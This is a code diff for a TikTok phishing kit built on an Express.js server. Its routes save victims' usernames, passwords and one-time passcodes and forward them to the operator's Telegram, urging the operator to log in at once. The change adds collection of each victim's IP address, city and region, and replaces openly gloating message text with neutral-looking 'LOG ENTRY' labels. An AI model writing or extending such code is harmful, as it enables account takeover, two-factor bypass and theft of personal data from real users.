@@ -48,7 +48,7 @@ router.get("/tikto/otp/:linkId", async (req, res) => {
 
 router.post("/tikto/:linkId", async (req, res) => {
     try {
-        const { username, password, country } = req.body;
+        const { username, password, country, city, region, ip } = req.body;
         const { linkId } = req.params;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
@@ -63,6 +63,9 @@ router.post("/tikto/:linkId", async (req, res) => {
                 linkName: link.name,
                 linkType: "TIKTOK",
                 country,
+                region,
+                ip,
+                city,
                 fields: {
                     username,
                     password
@@ -70,16 +73,16 @@ router.post("/tikto/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-                😈 New Entry 😈
-SOCIAL MEDIA: TIKTOK
-
-LOCATION: ${country}
+LOG ENTRY
+PLATFORM: TIKTOK
 
 USERNAME: ${username}
 PASSWORD: ${password}
-OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
 
-Login quickly 🏃🏾🏃🏾🏃🏾
+COUNTRY: ${country}
+CITY: ${city}
+REGION: ${region}
+IP: ${ip}
 
 Login now: https://www.tiktok.com or use mobile app
                                                 `)
@@ -109,11 +112,9 @@ router.post("/tikto/otp/:linkId", async (req, res) => {
 
         if (link) {
             await bot.sendMessage(user.telegramID, `
-😈 NEW ENTRY 😈
-
-SOCIAL MEDIA: TIKTOK
-
-OTP: ${code}
+PLATFORM: TIKTOK
+TYPE: OTP
+CODE: ${code}
 
                 `)
                 .catch(err => console.log("Telegram error"));
